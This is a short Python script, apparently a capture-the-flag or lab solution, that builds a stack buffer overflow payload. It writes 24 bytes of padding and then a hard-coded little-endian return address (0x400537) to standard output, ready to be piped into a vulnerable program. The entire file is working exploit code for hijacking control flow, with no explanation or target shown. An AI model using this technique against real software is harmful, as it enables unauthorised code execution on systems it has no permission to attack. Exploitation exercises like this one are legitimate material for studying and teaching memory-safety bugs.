#!/usr/bin/env python3

import sys


#oflow = b'A' * 32
oflow = b'A' * 24

exploit = bytearray(oflow)
faddr = 0x0000000000400537 
exploit.extend(faddr.to_bytes(8, byteorder='little'))
sys.stdout.buffer.write(exploit)


